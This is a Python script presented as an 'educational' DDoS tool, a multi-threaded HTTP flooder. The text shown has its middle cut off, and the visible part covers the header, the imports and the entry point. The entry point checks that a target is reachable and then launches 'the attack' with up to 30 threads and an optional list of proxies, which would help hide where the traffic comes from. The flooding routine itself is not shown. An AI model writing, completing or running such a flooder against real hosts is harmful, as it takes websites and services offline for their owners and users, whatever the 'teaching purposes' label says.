#!/usr/bin/python3
"""
DDoS Killer – Educational Tool
--------------------------------
A minimal, multi‑threaded HTTP flooder for teaching purposes only.
"""

# --------------------------------------------------------------------------- #
# Imports
# --------------------------------------------------------------------------- #
import argparse
import random
import signal
import sys
import threading
import time
from pathlib import Path

import requests as reqs          # pip install requests
impor… _sigint_handler)

    args = _parse_args()

    # 1️⃣ Baseline test – make sure the target is reachable
    baseline = test_connection(args.target)
    if baseline["avg_response"] is None:
        print("[!] Target appears to be unreachable – aborting.")
        sys.exit(1)

    print(f"[+] Baseline: {baseline}")

    # 2️⃣ Kick off the attack
    main(
        target=args.target,
        threads_count=min(args.threads, 30),          # Cap threads at 30
        proxy_file=args.proxy_file,
    )
